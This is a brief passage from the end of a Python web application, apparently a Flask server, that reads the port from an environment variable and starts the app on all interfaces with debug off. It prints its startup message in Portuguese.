    port = int(os.environ.get('PORT', 5000))
    print(f"🚀 Servidor com Menu de Dados iniciando na porta {port}")
    app.run(host='0.0.0.0', port=port, debug=False)
